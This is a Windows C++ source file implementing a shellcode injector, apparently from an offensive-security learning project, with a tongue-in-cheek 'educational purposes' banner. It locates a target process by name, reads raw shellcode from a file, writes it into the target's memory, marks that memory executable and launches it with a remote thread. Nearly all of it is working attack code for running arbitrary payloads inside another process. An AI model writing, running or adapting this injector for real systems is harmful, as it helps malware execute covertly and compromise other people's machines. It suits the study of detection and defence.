#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include "injection.h"

//-----------------------------------------------------------------------------------------------

unsigned char shellcode[MAX_SHELLCODE_SIZE] = { 0 };
size_t shellcodeSize = 0;

//-----------------------------------------------------------------------------------------------

#pragma region banner

void banner(void) {
	printf("\n-----------------------------------------------------------------------------------------------------------------------------\n");
	printf("\nDISCLAIMER: This code is for educational purposes only... because who doesn't want to learn how to print things, right? \n");
	printf("If you decide to use this for any malicious activities, well... congratulations, you're officially on the wrong side of history.\n");
	printf("But seriously, please don't. We don't need any more 'hackers' who think running random scripts makes them a legend. \n\n");
	printf("\n-----------------------------------------------------------------------------------------------------------------------------\n\n");
}

#pragma endregion

//-----------------------------------------------------------------------------------------------

#pragma region findPID

/*
HANDLE CreateToolhelp32Snapshot(
  [in] DWORD dwFlags,				; TH32CS_SNAPPROCESS because we want to take a snapshot of process
  [in] DWORD th32ProcessID			; Process Identifier we are going to use '0' to grab all process 
)
*/
DWORD findPID(char* procName) {
	// Converting char to char_t so we can compare both
	int len = MultiByteToWideChar(CP_UTF8, 0, procName, -1, NULL, 0);
	wchar_t* wcharProc = new wchar_t[len];
	MultiByteToWideChar(CP_UTF8, 0, procName, -1, wcharProc, len);

	// Creating a snapshot of all the process
	HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapShot == NULL) {
		yapBad("There was an error taking snapshot of all proecss");
		return NULL;
	}
	PROCESSENTRY32 procInfo = {0}; // Structure that will hold the information of the process.
	procInfo.dwSize = sizeof(PROCESSENTRY32);
	
	// Loop to find the process required
	if (Process32First(hSnapShot, &procInfo)) {
		for (BOOL nextProc = TRUE; nextProc; nextProc = Process32Next(hSnapShot, &procInfo)) {
			if (wcscmp(procInfo.szExeFile, wcharProc) == 0) {
				yapOkay("Found [%ls] process with PID (%d)", wcharProc, procInfo.th32ProcessID);
				CloseHandle(hSnapShot);
				delete[] wcharProc;
				return procInfo.th32ProcessID; // Returning PID
			}
		}
	}

	printf("Process [%ls] was not found", wcharProc);
	delete[] wcharProc;
	return NULL;
}

#pragma endregion

//-----------------------------------------------------------------------------------------------

#pragma region readFromFile

/* This function will save the shellcode and the size of shellcode into variables if executed successfully. The functions returns TURE (0) on successfull execution. Don't expect it to execute successfully tho */
BOOL LoadShellcodeFromFile(const char* filename) { // size_t is basically a unsigned 64bit integer
	FILE* pFile;
	fopen_s(&pFile, filename, "rb");
	if (pFile == NULL) {
		yapBad("Failed to open file: %s", filename);
		return FALSE;
	}

	/*
	@breif - Fread is used to read contents of a file pointer and return the size of the file and the save the contents of the file to a pointer to the buffer.
	@param1 - Pointer to save the contents read from the file
	@param2 - Size of each element to read
	@param3 - Max elements it can read
	@param4 - Pointer to the file
	*/
	shellcodeSize = fread(shellcode, 1, MAX_SHELLCODE_SIZE, pFile);
	if (shellcodeSize == 0) {
		yapBad("Failed to read shellcode from file or file is empty");
		fclose(pFile);
		return FALSE;
	}

	fclose(pFile);
	return TRUE;
}

#pragma endregion 

//-----------------------------------------------------------------------------------------------

#pragma region ShellcodeInjection

/*
ShellcodeInjection(DWORD PID,		; Process ID
const unsigned char* shellcode,		; ShellCode
size_t shellcodeSize);				; Size Of Shellcode
*/
BOOL ShellcodeInjection(DWORD PID, unsigned char* shellcode, size_t shellcodeSize) {
	DWORD TID = NULL;
	LPVOID buffer = NULL;
	DWORD lpflOldProtect = 0;

	HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (pHandle == NULL) {
		yapBad("Cannot get handle to the PID");
		return FALSE;
	}
	yapOkay("Got a handle [0x%p] for the process [%ld]", pHandle, PID);
	Sleep(1000);

	buffer = VirtualAllocEx(pHandle, NULL, shellcodeSize, (MEM_RESERVE | MEM_COMMIT), PAGE_READWRITE);
	if (buffer == NULL) {
		yapBad("Unable to allocate memory for the buffer");
		CloseHandle(pHandle); // Close the handle to the process on failing
		return FALSE;
	}
	yapOkay("Allocated buffer at [0x%p] ", buffer);
	Sleep(1000);

	if (!WriteProcessMemory(pHandle, buffer, shellcode, shellcodeSize, 0)) {
		yapBad("There was an error copying shellcode to the memory");
		VirtualFree(buffer, 0, MEM_RELEASE); // Release the allocated memory.
		CloseHandle(pHandle);
		return FALSE;
	}
	yapOkay("Copied the shellcode into buffer at [0x%p]", buffer);
	Sleep(1000);

	if (!VirtualProtectEx(pHandle, buffer, shellcodeSize, PAGE_EXECUTE_READ, &lpflOldProtect)) { // Change the permissions of memory region later
		yapBad("There was an error changing protection of the memory allocated at [0x%p]", buffer);
		VirtualFree(buffer, 0, MEM_RELEASE);
		CloseHandle(pHandle);
		return FALSE;
	}
	yapOkay("Changed the protection of memory allocated at [0x%p]", buffer);
	Sleep(1000);

	HANDLE tHandle = CreateRemoteThreadEx(pHandle, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, 0, &TID);
	if (tHandle == NULL) {
		yapBad("There was an error creating a remote thread");
		VirtualFree(buffer, 0, MEM_RELEASE);
		CloseHandle(pHandle);
		return FALSE;
	}
	yapOkay("Created a thread [%ld] and got the handle [0x%p]", TID, tHandle);
	Sleep(1000);
	yapWarn("Waiting for thread [%ld] to finish execution", TID);
	Sleep(1000);
	WaitForSingleObject(tHandle, INFINITE);
	yapWarn("Thread [%ld] finished execution. Cleaning up memory and closing handles", TID);
	Sleep(1000);

	VirtualFree(buffer, 0, MEM_RELEASE);
	CloseHandle(pHandle);
	CloseHandle(tHandle);

	return TRUE;
}

#pragma endregion
